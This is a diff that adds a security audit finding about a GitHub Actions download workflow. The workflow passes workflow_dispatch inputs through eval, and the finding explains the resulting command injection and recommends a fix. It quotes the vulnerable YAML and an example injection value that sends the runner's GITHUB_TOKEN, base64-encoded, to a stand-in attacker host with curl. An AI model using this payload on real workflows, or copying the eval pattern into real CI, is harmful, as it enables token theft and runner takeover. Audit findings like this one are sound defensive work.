@@ -1,0 +1,31 @@
+Issue #26: CI downloads user input via eval, allowing command injection in the runner
+Severity: High
+Component: CI/CD
+Location: .github/workflows/download-worker.yml:43-52
+
+Evidence:
+      - name: Execute Fast Multi-Part Download
+        run: |
+          ARGS="-u \"${{ github.event.inputs.download_url }}\" -c ${{ github.event.inputs.concurrency }} -s ${{ github.event.inputs.chunk_size }}"
+
+          if [ -n "${{ github.event.inputs.output_filename }}" ]; then
+            ARGS="$ARGS -o \"${{ github.event.inputs.output_filename }}\""
+          fi
+
+          echo "Running: ./bin/dlengine $ARGS"
+          eval "./bin/dlengine $ARGS"
+
+  workflow_dispatch inputs are interpolated directly into a shell script and
+  then fed to `eval`. A value such as:
+
+      "; curl http://attacker/$(cat $GITHUB_TOKEN | base64); #
+
+  (or backticks, $(), newlines) breaks out of the quoted argument and executes
+  arbitrary commands on the runner.
+
+Impact:
+  Anyone able to trigger the workflow (collaborator, or an org member on a
+  public repo via fork-style dispatch where permitted) gains command
+  execution on a GitHub-hosted runner with GITHUB_TOKEN and network access.
+  It is also trivially an SSRF/egress proxy by design (.download_url). Inputs
+  must be passed via env vars and quoted, or into an action, never `eval`ed.
